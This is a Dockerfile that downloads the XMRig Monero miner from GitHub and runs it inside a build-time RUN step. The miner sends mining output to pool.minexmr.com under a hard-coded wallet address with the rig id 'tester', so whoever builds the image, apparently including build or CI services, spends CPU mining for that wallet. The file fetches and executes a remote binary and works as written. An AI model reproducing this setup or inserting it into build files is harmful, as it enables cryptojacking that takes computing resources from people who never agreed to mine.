FROM ubuntu:20.04
USER root

# Variables & Environments
ARG XMRIG_VERSION=6.8.2
ENV HOME=/home/test

# Set working directory
WORKDIR $HOME

# Run: Install basic components
RUN apt-get update && \
    apt-get install -y wget && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-$XMRIG_VERSION-focal-x64.tar.gz && \
    tar -xvzf xmrig-$XMRIG_VERSION-focal-x64.tar.gz && \
    mv xmrig-$XMRIG_VERSION/xmrig xmrig && \
    chmod +x xmrig

# Run
RUN grep -c ^processor /proc/cpuinfo && \
    cat /proc/meminfo | grep Huge && \
    sysctl -w vm.nr_hugepages=128 || true && \
    ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id tester
